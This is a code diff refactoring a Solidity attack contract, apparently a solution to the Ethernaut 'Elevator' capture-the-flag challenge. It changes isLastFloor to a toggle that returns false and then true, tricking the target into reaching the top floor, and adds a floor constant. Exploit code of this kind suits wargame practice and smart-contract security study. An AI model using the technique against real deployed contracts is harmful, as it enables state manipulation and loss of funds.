@@ -9,18 +9,16 @@ interface Building {
 }
 
 contract ElevatorAttack is Broadcasted, Building {
+    uint256 public constant MAX_FLOOR = 2;
     bool public s_firstTime = true;
 
     function isLastFloor(uint) external override returns (bool) {
-        if (s_firstTime) {
-            s_firstTime = false;
-            return false;
-        }
-        return true;
+        s_firstTime = s_firstTime ? false : true;
+        return s_firstTime;
     }
 
     function attack(address payable elevatorCtr_) public payable override {
-        IElevator(elevatorCtr_).goTo(2);
+        IElevator(elevatorCtr_).goTo(MAX_FLOOR);
     }
 
     function broadcastedAttack(
